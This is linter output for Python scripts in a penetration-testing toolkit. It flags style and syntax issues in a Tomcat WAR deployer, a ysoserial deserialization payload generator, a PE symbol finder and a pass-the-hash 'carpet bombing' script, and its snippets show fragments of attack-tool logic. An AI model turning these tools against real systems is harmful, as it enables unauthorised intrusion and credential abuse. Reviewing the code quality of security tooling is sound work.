825 |         '', 
826 |         'manager', 
    |                   ^
827 |         'manager/html'
    |
help: Remove trailing whitespace

invalid-syntax: Multiple exception types must be parenthesized on Python 3.11 (syntax was added in Python 3.14)
   --> security\penetration-testing-tools\web\tomcatWarDeployer\tomcatWarDeployer.py:878:16
    |
876 |                 break
877 |
878 |         except urllib2.URLError, e:
    |                ^^^^^^^^^^^^^^^^^^^
879 |             error = str(e)
880 |             if 'Connection refused' in error:
    |

E701 Multiple statements on one line (colon)
    --> security\penetration-testing-tools\web\tomcatWarDeployer\tomcatWarDeployer.py:1068:39
     |
1066 |                         browser = url = None
1067 |
1068 |                     if browser and url: break
     |                                       ^
1069 |
1070 |                 except KeyboardInterrupt:
     |

W191 Indentation contains tabs
    --> security\penetration-testing-tools\web\tomcatWarDeployer\tomcatWarDeployer.py:1078:1
     |
1076 |                 browser, url = browseToManager(
1077 |                     args[0], opts.url, opts.user, opts.password)
1078 |         if browser == 403 and url == 403:
     | ^^^^^^^^
1079 |                     browser = url = None
     |

invalid-syntax: unindent does not match any outer indentation level
    --> security\penetration-testing-tools\web\tomcatWarDeployer\tomcatWarDeployer.py:1078:3
     |
1076 |                 browser, url = browseToManager(
1077 |                     args[0], opts.url, opts.user, opts.password)
1078 |         if browser == 403 and url == 403:
     |         ^
1079 |                     browser = url = None
     |

invalid-syntax: unindent does not match any outer indentation level
    --> security\penetration-testing-tools\web\tomcatWarDeployer\tomcatWarDeployer.py:1078:3
     |
1076 |                 browser, url = browseToManager(
1077 |                     args[0], opts.url, opts.user, opts.password)
1078 |         if browser == 403 and url == 403:
     |         ^
1079 |                     browser = url = None
     |

invalid-syntax: unindent does not match any outer indentation level
    --> security\penetration-testing-tools\web\tomcatWarDeployer\tomcatWarDeployer.py:1081:1
     |
1079 |                     browser = url = None
1080 |
1081 |             except KeyboardInterrupt:
     | ^^^^^^^^^^^^
1082 |                 logger.info(
1083 |                     "User has interrupted while browsing to Apache Manager.")
     |

invalid-syntax: Expected a statement
    --> security\penetration-testing-tools\web\tomcatWarDeployer\tomcatWarDeployer.py:1081:13
     |
1079 |                     browser = url = None
1080 |
1081 |             except KeyboardInterrupt:
     |             ^^^^^^
1082 |                 logger.info(
1083 |                     "User has interrupted while browsing to Apache Manager.")
     |

invalid-syntax: Expected an expression
    --> security\penetration-testing-tools\web\tomcatWarDeployer\tomcatWarDeployer.py:1081:38
     |
1079 |                     browser = url = None
1080 |
1081 |             except KeyboardInterrupt:
     |                                      ^
1082 |                 logger.info(
1083 |                     "User has interrupted while browsing to Apache Manager.")
     |

invalid-syntax: Unexpected indentation
    --> security\penetration-testing-tools\web\tomcatWarDeployer\tomcatWarDeployer.py:1082:1
     |
1081 |             except KeyboardInterrupt:
1082 |                 logger.info(
     | ^^^^^^^^^^^^^^^^
1083 |                     "User has interrupted while browsing to Apache Manager.")
1084 |                 return
     |

invalid-syntax: unindent does not match any outer indentation level
    --> security\penetration-testing-tools\web\tomcatWarDeployer\tomcatWarDeployer.py:1086:1
     |
1084 |                 return
1085 |
1086 |         if browser == None or url == None:
     | ^^^^^^^^
1087 |             logger.error('Service not found or could not authenticate to it.')
1088 |             return
     |

invalid-syntax: Expected dedent, found end of file
    --> security\penetration-testing-tools\web\tomcatWarDeployer\tomcatWarDeployer.py:1226:1
     |
1224 |     main()
1225 |     print()
     |            ^
     |

N816 Variable `skipGadgets` in global scope should not be mixedCase
   --> security\penetration-testing-tools\web\ysoserial-generator.py:106:1
    |
104 | #   host:port, write;destDir;ascii-data, localpath:remotepath and so on.
105 | #
106 | skipGadgets = (
    | ^^^^^^^^^^^
107 |     "Wicket1",
108 |     "FileUpload1",
    |

N816 Variable `warnCmdOnce` in global scope should not be mixedCase
   --> security\penetration-testing-tools\web\ysoserial-generator.py:117:1
    |
115 | )
116 |
117 | warnCmdOnce = False
    | ^^^^^^^^^^^
118 | generated = 0
119 | firstLaunch = True
    |

N816 Variable `firstLaunch` in global scope should not be mixedCase
   --> security\penetration-testing-tools\web\ysoserial-generator.py:119:1
    |
117 | warnCmdOnce = False
118 | generated = 0
119 | firstLaunch = True
    | ^^^^^^^^^^^
120 |
121 | commandsSoFar = set()
    |

N816 Variable `commandsSoFar` in global scope should not be mixedCase
   --> security\penetration-testing-tools\web\ysoserial-generator.py:121:1
    |
119 | firstLaunch = True
120 |
121 | commandsSoFar = set()
    | ^^^^^^^^^^^^^
    |

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\web\ysoserial-generator.py:169:17
    |
167 |             return ""
168 |         elif not config["output"]:
169 |             p = "ysoserial-payloads.{ext}".format(ext=ext)
    |                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
170 |
171 |             if os.path.isfile(p) and firstLaunch:
    |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\web\ysoserial-generator.py:173:21
    |
171 |             if os.path.isfile(p) and firstLaunch:
172 |                 Logger.err(
173 |                     'Output file ("{}") already exists: unable to continue.'.format(p)
    |                     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
174 |                 )
175 |                 sys.exit(1)
    |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\web\ysoserial-generator.py:181:15
    |
179 |       else:
180 |           path = ""
181 |           out = "ysoserial-{gadget}-{name}-payload.{ext}".format(
    |  _______________^
182 | |             name=name, gadget=gadget, ext=ext
183 | |         )
    | |_________^
184 |
185 |           if config["output"] != "-":
    |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\web\ysoserial-generator.py:197:16
    |
196 |     cmd2 = cmd
197 |     Logger.dbg("Command before processing:\n{}\n".format(cmd))
    |                ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
198 |
199 |     data = "{gadget}-{name}".format(gadget=gadget, name=name)
    |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\web\ysoserial-generator.py:199:12
    |
197 |     Logger.dbg("Command before processing:\n{}\n".format(cmd))
198 |
199 |     data = "{gadget}-{name}".format(gadget=gadget, name=name)
    |            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
200 |
201 |     lhost = config["lhost"]
    |
help: Convert to f-string

N806 Variable `notWorking` in function should be lowercase
   --> security\penetration-testing-tools\web\ysoserial-generator.py:204:9
    |
203 |     if not warnCmdOnce:
204 |         notWorking = ["|", "&", "<", ">", ";"]
    |         ^^^^^^^^^^
205 |         for n in notWorking:
206 |             if n in cmd:
    |

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\web\ysoserial-generator.py:209:21
    |
207 |   ΓÇª     warnCmdOnce = True
208 |   ΓÇª     Logger.fail(
209 | / ΓÇª         'WARNING: Your command contains character that will prevent your payload from running correctly: "{}". Remember shortcomingΓÇª
210 | | ΓÇª             n
211 | | ΓÇª         )
    | |___________^
212 |   ΓÇª     )
213 |   ΓÇª     break
    |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\web\ysoserial-generator.py:217:29
    |
215 |     if "data" in cmd:
216 |         if config["predefined"] and config["predefined-cmd"] == "ping":
217 |             data = "".join(["{:02x}".format(ord(x)) for x in data[:16]])
    |                             ^^^^^^^^^^^^^^^^^^^^^^^
218 |
219 |         if config["predefined"] and config["predefined-cmd"] == "http":
    |
help: Convert to f-string

SIM102 Use a single `if` statement instead of nested `if` statements
   --> security\penetration-testing-tools\web\ysoserial-generator.py:219:9
    |
217 |               data = "".join(["{:02x}".format(ord(x)) for x in data[:16]])
218 |
219 | /         if config["predefined"] and config["predefined-cmd"] == "http":
220 | |             if not lhost.startswith("http"):
    | |____________________________________________^
221 |                   lhost = "http://" + lhost
    |
help: Combine `if` statements using `and`

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\web\ysoserial-generator.py:228:16
    |
226 |         cmd2 = cmd2.format(host=lhost)
227 |
228 |     Logger.dbg("Command after processing:\n{}\n".format(cmd2))
    |                ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
229 |
230 |     cmd3 = cmd2.replace(data, "...")
    |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\web\ysoserial-generator.py:232:26
    |
230 |     cmd3 = cmd2.replace(data, "...")
231 |     if cmd3 not in commandsSoFar:
232 |         sys.stderr.write('[+] Command within payload:\n\t"{}"\n'.format(cmd3))
    |                          ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
233 |         commandsSoFar.add(cmd3)
    |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\web\ysoserial-generator.py:243:24
    |
241 |     for gadget in config["gadgets"]:
242 |         if gadget in skipGadgets:
243 |             Logger.dbg("Skipping gadget {}...".format(gadget))
    |                        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
244 |             continue
    |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\web\ysoserial-generator.py:281:29
    |
279 |                     if config["onefile"]:
280 |                         Logger.dbg(
281 |                             'Appending payload to the file: "{}"'.format(filename)
    |                             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
282 |                         )
283 |                         mode = "a"
    |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\web\ysoserial-generator.py:285:35
    |
283 |                         mode = "a"
284 |                     else:
285 |                         Logger.ok('Writing payload to the file: "{}"'.format(filename))
    |                                   ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
286 |
287 |                     with open(filename, mode) as f:
    |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\web\ysoserial-generator.py:293:17
    |
291 |           else:
292 |               Logger.err(
293 | /                 'Failed generating payload {}-{} for cmd: "{}"'.format(
294 | |                     gadget, name, cmd2
295 | |                 )
    | |_________________^
296 |               )
    |
help: Convert to f-string

N803 Argument name `noOut` should be lowercase
   --> security\penetration-testing-tools\web\ysoserial-generator.py:315:16
    |
315 | def shell(cmd, noOut=False, surpressStderr=False):
    |                ^^^^^^^^^^^
316 |     cmd = processShellCmd(cmd)
317 |     out = ""
    |

N803 Argument name `surpressStderr` should be lowercase
   --> security\penetration-testing-tools\web\ysoserial-generator.py:315:29
    |
315 | def shell(cmd, noOut=False, surpressStderr=False):
    |                             ^^^^^^^^^^^^^^^^^^^^
316 |     cmd = processShellCmd(cmd)
317 |     out = ""
    |

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\web\ysoserial-generator.py:328:17
    |
326 |           else:
327 |               Logger.dbg(
328 | /                 "Error ({}): shell('{}') returned code {}: {}".format(
329 | |                     str(e), e.cmd, e.returncode, e.output
330 | |                 )
    | |_________________^
331 |               )
    |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\web\ysoserial-generator.py:334:20
    |
333 |     if not noOut:
334 |         Logger.dbg("shell('{}') returned:\n\"{}\"\n".format(cmd, out))
    |                    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
335 |     else:
336 |         Logger.dbg("shell('{}')\n".format(cmd))
    |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\web\ysoserial-generator.py:336:20
    |
334 |         Logger.dbg("shell('{}') returned:\n\"{}\"\n".format(cmd, out))
335 |     else:
336 |         Logger.dbg("shell('{}')\n".format(cmd))
    |                    ^^^^^^^^^^^^^^^^^^^^^^^^^^^
337 |
338 |     return out
    |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\web\ysoserial-generator.py:409:9
    |
408 |       print(
409 | /         """
410 | |         :: ysoserial payloads generation helper
411 | |         Helps generate many variations of payloads to try against vulnerable application.
412 | |         Mariusz Banach / mgeeky '18, <mb@binary-offensive.com>
413 | |         v{}
414 | | """.format(
415 | |             VERSION
416 | |         )
    | |_________^
417 |       )
    |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\web\ysoserial-generator.py:522:16
    |
520 |         config["platform"] = "windows"
521 |
522 |     Logger.dbg("Found platform: {}".format(platform))
    |                ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
523 |
524 |     if args.command and args.predefined:
    |
help: Convert to f-string

SIM113 Use `enumerate()` for index variable `num` in `for` loop
   --> security\penetration-testing-tools\web\ysoserial-generator.py:591:17
    |
589 |             num = 0
590 |             for cmd in config["command"].split(";"):
591 |                 num += 1
    |                 ^^^^^^^^
592 |                 generate("custom-cmd{}".format(num), cmd.strip())
593 |         else:
    |

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\web\ysoserial-generator.py:592:26
    |
590 |             for cmd in config["command"].split(";"):
591 |                 num += 1
592 |                 generate("custom-cmd{}".format(num), cmd.strip())
    |                          ^^^^^^^^^^^^^^^^^^^^^^^^^^
593 |         else:
594 |             generate("custom", config["command"])
    |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\web\ysoserial-generator.py:599:17
    |
597 |         generate("linux", predefined[config["predefined-cmd"]]["linux"])
598 |
599 |     Logger.info("Generated: {} payloads.".format(generated))
    |                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
    |
help: Convert to f-string

SIM112 Use capitalized environment variable `WINDIR` instead of `Windir`
  --> security\penetration-testing-tools\windows\find-system-and-syswow64-binaries.py:16:34
   |
14 |     system32 = set()
15 |     syswow64 = set()
16 |     p1 = os.path.join(os.environ["Windir"], "System32" + os.sep + "*." + ext)
   |                                  ^^^^^^^^
17 |     p2 = os.path.join(os.environ["Windir"], "SysWOW64" + os.sep + "*." + ext)
   |
help: Replace `Windir` with `WINDIR`

SIM112 Use capitalized environment variable `WINDIR` instead of `Windir`
  --> security\penetration-testing-tools\windows\find-system-and-syswow64-binaries.py:17:34
   |
15 |     syswow64 = set()
16 |     p1 = os.path.join(os.environ["Windir"], "System32" + os.sep + "*." + ext)
17 |     p2 = os.path.join(os.environ["Windir"], "SysWOW64" + os.sep + "*." + ext)
   |                                  ^^^^^^^^
18 |
19 |     sys.stderr.write("[.] System32: " + p1 + "\n")
   |
help: Replace `Windir` with `WINDIR`

F401 [*] `pprint` imported but unused
  --> security\penetration-testing-tools\windows\findSymbols.py:22:8
   |
20 | import os
21 | import platform
22 | import pprint
   |        ^^^^^^
23 | import re
24 | import signal
   |
help: Remove unused import: `pprint`

F401 [*] `subprocess` imported but unused
  --> security\penetration-testing-tools\windows\findSymbols.py:25:8
   |
23 | import re
24 | import signal
25 | import subprocess
   |        ^^^^^^^^^^
26 | import sys
27 | import tempfile
   |
help: Remove unused import: `subprocess`

F401 [*] `tempfile` imported but unused
  --> security\penetration-testing-tools\windows\findSymbols.py:27:8
   |
25 | import subprocess
26 | import sys
27 | import tempfile
   |        ^^^^^^^^
28 | import textwrap
29 | import time
   |
help: Remove unused import: `tempfile`

F401 [*] `time` imported but unused
  --> security\penetration-testing-tools\windows\findSymbols.py:29:8
   |
27 | import tempfile
28 | import textwrap
29 | import time
   |        ^^^^
30 | from datetime import datetime
31 | from itertools import product
   |
help: Remove unused import: `time`

F401 [*] `itertools.product` imported but unused
  --> security\penetration-testing-tools\windows\findSymbols.py:31:23
   |
29 | import time
30 | from datetime import datetime
31 | from itertools import product
   |                       ^^^^^^^
32 | from multiprocessing import Lock, Manager, Pool, Process, Queue, freeze_support
   |
help: Remove unused import: `itertools.product`

F401 [*] `multiprocessing.Lock` imported but unused
  --> security\penetration-testing-tools\windows\findSymbols.py:32:29
   |
30 | from datetime import datetime
31 | from itertools import product
32 | from multiprocessing import Lock, Manager, Pool, Process, Queue, freeze_support
   |                             ^^^^
33 |
34 | import pefile
   |
help: Remove unused import

F401 [*] `multiprocessing.Process` imported but unused
  --> security\penetration-testing-tools\windows\findSymbols.py:32:50
   |
30 | from datetime import datetime
31 | from itertools import product
32 | from multiprocessing import Lock, Manager, Pool, Process, Queue, freeze_support
   |                                                  ^^^^^^^
33 |
34 | import pefile
   |
help: Remove unused import

F401 [*] `multiprocessing.Queue` imported but unused
  --> security\penetration-testing-tools\windows\findSymbols.py:32:59
   |
30 | from datetime import datetime
31 | from itertools import product
32 | from multiprocessing import Lock, Manager, Pool, Process, Queue, freeze_support
   |                                                           ^^^^^
33 |
34 | import pefile
   |
help: Remove unused import

UP031 Use format specifiers instead of percent format
  --> security\penetration-testing-tools\windows\findSymbols.py:73:16
   |
71 |     @staticmethod
72 |     def with_color(c, s):
73 |         return "\x1b[%dm%s\x1b[0m" % (c, s)
   |                ^^^^^^^^^^^^^^^^^^^
74 |
75 |     @staticmethod
   |
help: Replace with format specifiers

UP031 Use format specifiers instead of percent format
  --> security\penetration-testing-tools\windows\findSymbols.py:77:16
   |
75 |     @staticmethod
76 |     def end_color(s):
77 |         return "%s\x1b[0m" % (s)
   |                ^^^^^^^^^^^^^^^^^
78 |
79 |     @staticmethod
   |
help: Replace with format specifiers

N803 Argument name `uniqueSymbols` should be lowercase
   --> security\penetration-testing-tools\windows\findSymbols.py:135:43
    |
135 | def verifyCriterias(args, regexes, infos, uniqueSymbols):
    |                                           ^^^^^^^^^^^^^
136 |     if args.unique and infos["symbol"] in uniqueSymbols:
137 |         verbose(
    |

N806 Variable `regexesVerified` in function should be lowercase
   --> security\penetration-testing-tools\windows\findSymbols.py:157:5
    |
155 |         return False
156 |
157 |     regexesVerified = sum([len(v) for k, v in regexes.items()])
    |     ^^^^^^^^^^^^^^^
158 |
159 |     regexes_name = len(regexes["name"])
    |

F841 Local variable `regexes_not_name` is assigned to but never used
   --> security\penetration-testing-tools\windows\findSymbols.py:160:5
    |
159 |     regexes_name = len(regexes["name"])
160 |     regexes_not_name = len(regexes["not-name"])
    |     ^^^^^^^^^^^^^^^^
161 |     regexes_module = len(regexes["module"])
162 |     regexes_not_module = len(regexes["not-module"])
    |
help: Remove assignment to unused variable `regexes_not_name`

N806 Variable `carryOn` in function should be lowercase
   --> security\penetration-testing-tools\windows\findSymbols.py:205:5
    |
204 |     satisifed = False
205 |     carryOn = False
    |     ^^^^^^^
206 |
207 |     if len(regexes["module"]) > 0:
    |

N806 Variable `carryOn` in function should be lowercase
   --> security\penetration-testing-tools\windows\findSymbols.py:219:17
    |
217 |                     f'(+) Symbol\'s module {infos["module"]}.{infos["symbol"]} satisfied module ({name}) regex.',
218 |                 )
219 |                 carryOn = True
    |                 ^^^^^^^
220 |                 break
221 |     else:
    |

N806 Variable `carryOn` in function should be lowercase
   --> security\penetration-testing-tools\windows\findSymbols.py:222:9
    |
220 |                 break
221 |     else:
222 |         carryOn = True
    |         ^^^^^^^
223 |
224 |     if regexes_name == 0:
    |

N806 Variable `uniqueSymbols` in function should be lowercase
   --> security\penetration-testing-tools\windows\findSymbols.py:268:13
    |
266 |             path,
267 |             results,
268 |             uniqueSymbols,
    |             ^^^^^^^^^^^^^
269 |             filesProcessed,
270 |             symbolsProcessed,
    |

N806 Variable `filesProcessed` in function should be lowercase
   --> security\penetration-testing-tools\windows\findSymbols.py:269:13
    |
267 |             results,
268 |             uniqueSymbols,
269 |             filesProcessed,
    |             ^^^^^^^^^^^^^^
270 |             symbolsProcessed,
271 |         ) = arguments
    |

N806 Variable `symbolsProcessed` in function should be lowercase
   --> security\penetration-testing-tools\windows\findSymbols.py:270:13
    |
268 |             uniqueSymbols,
269 |             filesProcessed,
270 |             symbolsProcessed,
    |             ^^^^^^^^^^^^^^^^
271 |         ) = arguments
272 |         out = processFile(
    |

N803 Argument name `uniqueSymbols` should be lowercase
   --> security\penetration-testing-tools\windows\findSymbols.py:289:35
    |
288 | def processFile(
289 |     args, regexes, path, results, uniqueSymbols, filesProcessed, symbolsProcessed
    |                                   ^^^^^^^^^^^^^
290 | ):
291 |     verbose(args, "Processing file: " + path)
    |

N803 Argument name `filesProcessed` should be lowercase
   --> security\penetration-testing-tools\windows\findSymbols.py:289:50
    |
288 | def processFile(
289 |     args, regexes, path, results, uniqueSymbols, filesProcessed, symbolsProcessed
    |                                                  ^^^^^^^^^^^^^^
290 | ):
291 |     verbose(args, "Processing file: " + path)
    |

N803 Argument name `symbolsProcessed` should be lowercase
   --> security\penetration-testing-tools\windows\findSymbols.py:289:66
    |
288 | def processFile(
289 |     args, regexes, path, results, uniqueSymbols, filesProcessed, symbolsProcessed
    |                                                                  ^^^^^^^^^^^^^^^^
290 | ):
291 |     verbose(args, "Processing file: " + path)
    |

E722 Do not use bare `except`
   --> security\penetration-testing-tools\windows\findSymbols.py:299:5
    |
297 |         mod.parse_data_directories()
298 |
299 |     except:
    |     ^^^^^^
300 |         mod.close()
301 |         return
    |

N806 Variable `symbolType` in function should be lowercase
   --> security\penetration-testing-tools\windows\findSymbols.py:310:9
    |
308 |     once = False
309 |
310 |     for symbolType, symbolModule, symbolName in symbols:
    |         ^^^^^^^^^^
311 |         infos = {
312 |             "path": path,
    |

N806 Variable `symbolModule` in function should be lowercase
   --> security\penetration-testing-tools\windows\findSymbols.py:310:21
    |
308 |     once = False
309 |
310 |     for symbolType, symbolModule, symbolName in symbols:
    |                     ^^^^^^^^^^^^
311 |         infos = {
312 |             "path": path,
    |

N806 Variable `symbolName` in function should be lowercase
   --> security\penetration-testing-tools\windows\findSymbols.py:310:35
    |
308 |     once = False
309 |
310 |     for symbolType, symbolModule, symbolName in symbols:
    |                                   ^^^^^^^^^^
311 |         infos = {
312 |             "path": path,
    |

N806 Variable `appendRow` in function should be lowercase
   --> security\penetration-testing-tools\windows\findSymbols.py:330:13
    |
329 |         if args.format == "text":
330 |             appendRow = verifyCriterias(args, regexes, infos, uniqueSymbols)
    |             ^^^^^^^^^
331 |
332 |             if args.color:
    |

N806 Variable `MaxWidth` in function should be lowercase
   --> security\penetration-testing-tools\windows\findSymbols.py:344:17
    |
342 |             if appendRow:
343 |                 row = []
344 |                 MaxWidth = 40
    |                 ^^^^^^^^
345 |
346 |                 for h in headers:
    |

E721 Use `is` and `is not` for type comparisons, or `isinstance()` for isinstance checks
   --> security\penetration-testing-tools\windows\findSymbols.py:350:25
    |
349 |                     if (
350 |                         type(infos[h]) == set
    |                         ^^^^^^^^^^^^^^^^^^^^^
351 |                         or type(infos[h]) == list
352 |                         or type(infos[h]) == tuple
    |

E721 Use `is` and `is not` for type comparisons, or `isinstance()` for isinstance checks
   --> security\penetration-testing-tools\windows\findSymbols.py:351:28
    |
349 |                     if (
350 |                         type(infos[h]) == set
351 |                         or type(infos[h]) == list
    |                            ^^^^^^^^^^^^^^^^^^^^^^
352 |                         or type(infos[h]) == tuple
353 |                     ):
    |

E721 Use `is` and `is not` for type comparisons, or `isinstance()` for isinstance checks
   --> security\penetration-testing-tools\windows\findSymbols.py:352:28
    |
350 |                         type(infos[h]) == set
351 |                         or type(infos[h]) == list
352 |                         or type(infos[h]) == tuple
    |                            ^^^^^^^^^^^^^^^^^^^^^^^
353 |                     ):
354 |                         obj = ", ".join(infos[h])
    |

E721 Use `is` and `is not` for type comparisons, or `isinstance()` for isinstance checks
   --> security\penetration-testing-tools\windows\findSymbols.py:358:24
    |
356 |                         obj = infos[h]
357 |
358 |                     if type(obj) == str and len(obj) > MaxWidth:
    |                        ^^^^^^^^^^^^^^^^
359 |                         if h == "path":
360 |                             obj = "\n".join(textwrap.wrap(obj, width=2 * MaxWidth))
    |

N806 Variable `appendRow` in function should be lowercase
   --> security\penetration-testing-tools\windows\findSymbols.py:378:13
    |
377 |         elif args.format == "json":
378 |             appendRow = verifyCriterias(args, regexes, infos, uniqueSymbols)
    |             ^^^^^^^^^
379 |
380 |             if args.color:
    |

N803 Argument name `uniqueSymbols` should be lowercase
   --> security\penetration-testing-tools\windows\findSymbols.py:417:35
    |
416 | def processDir(
417 |     args, regexes, path, results, uniqueSymbols, filesProcessed, symbolsProcessed
    |                                   ^^^^^^^^^^^^^
418 | ):
419 |     filePaths = []
    |

N803 Argument name `filesProcessed` should be lowercase
   --> security\penetration-testing-tools\windows\findSymbols.py:417:50
    |
416 | def processDir(
417 |     args, regexes, path, results, uniqueSymbols, filesProcessed, symbolsProcessed
    |                                                  ^^^^^^^^^^^^^^
418 | ):
419 |     filePaths = []
    |

N803 Argument name `symbolsProcessed` should be lowercase
   --> security\penetration-testing-tools\windows\findSymbols.py:417:66
    |
416 | def processDir(
417 |     args, regexes, path, results, uniqueSymbols, filesProcessed, symbolsProcessed
    |                                                                  ^^^^^^^^^^^^^^^^
418 | ):
419 |     filePaths = []
    |

N806 Variable `filePaths` in function should be lowercase
   --> security\penetration-testing-tools\windows\findSymbols.py:419:5
    |
417 |     args, regexes, path, results, uniqueSymbols, filesProcessed, symbolsProcessed
418 | ):
419 |     filePaths = []
    |     ^^^^^^^^^
420 |
421 |     out("[.] Building list of files to process...")
    |

F541 [*] f-string without any placeholders
   --> security\penetration-testing-tools\windows\findSymbols.py:473:17
    |
471 |         out(f'[.] Scanning {Logger.colored(args, len(filePaths), "yellow")} files...')
472 |         if len(filePaths) > 5000:
473 |             out(f"[.] Be patient that's gonna take a long while...")
    |                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
474 |
475 |         res = pool.map(processFileWorker, arguments)
    |
help: Remove extraneous `f` prefix

F841 Local variable `res` is assigned to but never used
   --> security\penetration-testing-tools\windows\findSymbols.py:475:9
    |
473 |             out(f"[.] Be patient that's gonna take a long while...")
474 |
475 |         res = pool.map(processFileWorker, arguments)
    |         ^^^
476 |
477 |     except KeyboardInterrupt:
    |
help: Remove assignment to unused variable `res`

E731 Do not assign a `lambda` expression, use a `def`
   --> security\penetration-testing-tools\windows\findSymbols.py:596:5
    |
594 |         sys.exit(1)
595 |
596 |     accomodate_rex = lambda x: f"({x})"
    |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
597 |
598 |     regexes = {"name": [], "not-name": [], "module": [], "not-module": []}
    |
help: Rewrite `accomodate_rex` as a `def`

N806 Variable `uniqueSymbols` in function should be lowercase
   --> security\penetration-testing-tools\windows\findSymbols.py:626:5
    |
624 | def main():
625 |     results = Manager().list()
626 |     uniqueSymbols = Manager().list()
    |     ^^^^^^^^^^^^^
627 |     filesProcessed = Manager().Value("i", 0)
628 |     symbolsProcessed = Manager().Value("i", 0)
    |

N806 Variable `filesProcessed` in function should be lowercase
   --> security\penetration-testing-tools\windows\findSymbols.py:627:5
    |
625 |     results = Manager().list()
626 |     uniqueSymbols = Manager().list()
627 |     filesProcessed = Manager().Value("i", 0)
    |     ^^^^^^^^^^^^^^
628 |     symbolsProcessed = Manager().Value("i", 0)
    |

N806 Variable `symbolsProcessed` in function should be lowercase
   --> security\penetration-testing-tools\windows\findSymbols.py:628:5
    |
626 |     uniqueSymbols = Manager().list()
627 |     filesProcessed = Manager().Value("i", 0)
628 |     symbolsProcessed = Manager().Value("i", 0)
    |     ^^^^^^^^^^^^^^^^
629 |
630 |     out(
    |

W293 Blank line contains whitespace
   --> security\penetration-testing-tools\windows\findSymbols.py:633:1
    |
631 |         """
632 |     :: findSymbols.py - Finds PE Import/Exports based on supplied filters.
633 |     
    | ^^^^
634 |     Mariusz Banach / mgeeky, '21
635 |     <mb [at] binary-offensive.com> 
    |
help: Remove whitespace from blank line

W291 Trailing whitespace
   --> security\penetration-testing-tools\windows\findSymbols.py:635:35
    |
634 |     Mariusz Banach / mgeeky, '21
635 |     <mb [at] binary-offensive.com> 
    |                                   ^
636 | """
637 |     )
    |
help: Remove trailing whitespace

F541 [*] f-string without any placeholders
   --> security\penetration-testing-tools\windows\findSymbols.py:681:13
    |
680 |     except KeyboardInterrupt:
681 |         out(f"[-] User interrupted the scan.")
    |             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
682 |
683 |     time_elapsed = datetime.now() - start_time
    |
help: Remove extraneous `f` prefix

N806 Variable `resultsList` in function should be lowercase
   --> security\penetration-testing-tools\windows\findSymbols.py:686:9
    |
685 |     if args.format == "json":
686 |         resultsList = list(results)
    |         ^^^^^^^^^^^
687 |         dumped = str(json.dumps(resultsList, indent=4))
    |

N806 Variable `resultsList` in function should be lowercase
   --> security\penetration-testing-tools\windows\findSymbols.py:695:9
    |
693 |             print("\n" + dumped)
694 |     else:
695 |         resultsList = list(results)
    |         ^^^^^^^^^^^
696 |         if len(resultsList) > 0:
    |

B007 Loop control variable `i` not used within loop body
   --> security\penetration-testing-tools\windows\findSymbols.py:706:21
    |
705 |             if args.first > 0:
706 |                 for i in range(len(resultsList) - args.first):
    |                     ^
707 |                     resultsList.pop()
    |
help: Rename unused `i` to `_i`

F541 [*] f-string without any placeholders
   --> security\penetration-testing-tools\windows\findSymbols.py:735:17
    |
734 |         else:
735 |             out(f"[-] Did not find symbols meeting specified criterias.")
    |                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
736 |
737 |         out(
    |
help: Remove extraneous `f` prefix

W291 [*] Trailing whitespace
 --> security\penetration-testing-tools\windows\pth-carpet.py:4:64
  |
3 | #
4 | # Simple script intended to perform Carpet Bombing against list 
  |                                                                ^
5 | # of provided machines using list of provided LSA Hashes (LM:NTLM).
6 | # The basic idea with Pass-The-Hash attack is to get One hash and use it
  |
help: Remove trailing whitespace

